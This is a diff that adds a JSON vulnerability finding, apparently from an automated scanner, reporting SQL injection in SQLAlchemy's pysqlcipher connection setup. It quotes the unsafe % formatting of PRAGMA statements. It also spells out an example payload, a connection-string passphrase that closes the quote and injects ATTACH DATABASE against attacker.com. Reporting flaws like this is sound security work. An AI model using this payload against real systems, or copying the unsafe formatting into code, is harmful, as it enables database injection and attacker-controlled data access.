@@ -1,0 +1,23 @@
+[
+  {
+    "FindingID": "8208686e-f93c-522f-800b-a5d0b7700781",
+    "SessionID": "ChA3ZTA3OGZhMGI0MjZkYWU1EAgaATAqBG1haW4",
+    "Title": "SQL Injection in SQLite SQLCipher Dialect Connection Initialization (pysqlcipher)",
+    "FilePath": "lib/sqlalchemy/dialects/sqlite/pysqlcipher.py",
+    "Severity": "HIGH",
+    "Confidence": 100,
+    "Analysis": "### Vulnerability Analysis\n\nIn `lib/sqlalchemy/dialects/sqlite/pysqlcipher.py`, the `on_connect_url` method returns a connection callback `on_connect` that runs immediately after a connection is created.\n\nThis callback dynamically constructs and executes SQLite `PRAGMA` statements:\n- `cursor.execute('pragma key=\"%s\"' % passphrase)` (using the URL's password/passphrase).\n- `cursor.execute('pragma %s=\"%s\"' % (prag, value))` (using option query parameters like `cipher`, `kdf_iter`, `cipher_page_size`, and `cipher_use_hmac`).\n\nBecause the passphrase and option values are concatenated into the `PRAGMA` statement using simple Python `%` formatting (with double quotes surrounding the value) and are not sanitized, a malicious passphrase or option value containing a double-quote character can escape the string context. This allows an attacker who controls the connection string (or the database options passed via query parameters) to perform SQL injection.\n\n### Conceptual Exploit Payload\n\nIf an application allows a user to supply a custom connection URL or uses a user-controlled password or parameter configuration, the attacker could supply the following database connection string:\n\n`sqlite+pysqlcipher://:malicious_pass%22%3B%20ATTACH%20DATABASE%20%27http%3A%2F%2Fattacker.com%2Fevil.db%27%20AS%20evil_db%3B%20--@/mydb.db`\n\nWhen decoded, the connection passphrase (`passphrase`) extracted from the URL is:\n`malicious_pass\"; ATTACH DATABASE 'http://attacker.com/evil.db' AS evil_db; --`\n\nWhen this is concatenated in:\n`cursor.execute('pragma key=\"%s\"' % passphrase)`\n\nThe executed SQL query is:\n`pragma key=\"malicious_pass\"; ATTACH DATABASE 'http://attacker.com/evil.db' AS evil_db; --\"`\n\nThis closes the double-quoted string context of the `key` pragma, terminates the statement with a semicolon, executes the injected `ATTACH DATABASE` SQL statement (or any other arbitrary SQLite statement), and comments out the remainder of the query, successfully achieving SQL Injection (SQLi) at connection initialization.",
+    "Snippet": "    def on_connect_url(self, url):\n        super_on_connect = super().on_connect_url(url)\n\n        # pull the info we need from the URL early.  Even though URL\n        # is immutable, we don't want any in-place changes to the URL\n        # to affect things\n        passphrase = url.password or \"\"\n        url_query = dict(url.query)\n\n        def on_connect(conn):\n            cursor = conn.cursor()\n            cursor.execute('pragma key=\"%s\"' % passphrase)\n            for prag in self.pragmas:\n                value = url_query.get(prag, None)\n                if value is not None:\n                    cursor.execute('pragma %s=\"%s\"' % (prag, value))\n            cursor.close()\n\n            if super_on_connect:\n                super_on_connect(conn)\n\n        return on_connect",
+    "VulnType": "CWE-89",
+    "VulnID": "CWE-89",
+    "Fingerprint": "",
+    "Status": "OPEN",
+    "SourceStage": "",
+    "FindingJSON": "",
+    "UpdatedAt": "",
+    "StartLine": 126,
+    "EndLine": 147,
+    "DismissReason": "",
+    "ConfidenceLevel": ""
+  }
+]
